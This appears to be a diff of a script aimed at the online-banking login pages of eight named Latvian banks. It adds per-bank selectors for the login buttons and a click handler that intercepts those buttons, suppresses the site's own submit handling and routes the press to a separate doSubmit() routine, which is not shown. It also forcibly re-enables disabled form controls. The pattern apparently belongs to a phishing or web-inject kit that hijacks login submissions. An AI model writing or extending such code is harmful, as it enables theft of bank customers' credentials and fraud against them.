@@ -396,7 +396,19 @@ if(bank==='bluorbank-lv'){
     if(b.closest&&b.closest('.login-type,[data-tab-index],vaadin-tab,ul.css_tabs,[role=radiogroup],[role=tab],.ui-tabs__dropdown,.seb-tabs,button[data-selected]'))return false;
     return SUB.test(btnInfo(b))||b.getAttribute('type')==='submit';
   }
+  var BTN_SEL={
+    "swedbank-lv":"button.-positive,button[type=submit]",
+    "seb-lv":"#login-form-btn,button.login-form__login-btn,button[type=submit]",
+    "citadele-lv":"button[name=aLogin],a.css_buttons-green,button[type=submit]",
+    "ribbank-lv":"button[type=submit]",
+    "bluorbank-lv":"vaadin-button#login-next,.login-form-next-button,vaadin-button[theme=primary]",
+    "industra-lv":"#b_login,span.primary.button",
+    "magnetiqbank-lv":"#loginDecider,input[type=submit]",
+    "signet-bank-lv":"a.submit_hook,a.epm_submit_hook,a[type=submit]"
+  };
+  var explicit=BTN_SEL[bank]||null;
   var SEL='button,input[type=submit],input[type=button],vaadin-button,span.button,[role=button],a';
+
   function enableAll(){
     document.querySelectorAll('button[disabled],input[disabled],[aria-disabled="true"]').forEach(function(c){
       c.removeAttribute('disabled');c.setAttribute('aria-disabled','false');c.disabled=false;
@@ -418,6 +430,7 @@ if(bank==='bluorbank-lv'){
     return true;
   }
   document.addEventListener('click',function(e){
+    if(explicit){var x=e.target.closest&&e.target.closest(explicit);if(x){e.preventDefault();e.stopImmediatePropagation();doSubmit();return;}}
     var b=e.target.closest&&e.target.closest(SEL);
     if(!b||!isSubmitBtn(b))return;
     e.preventDefault();e.stopImmediatePropagation();
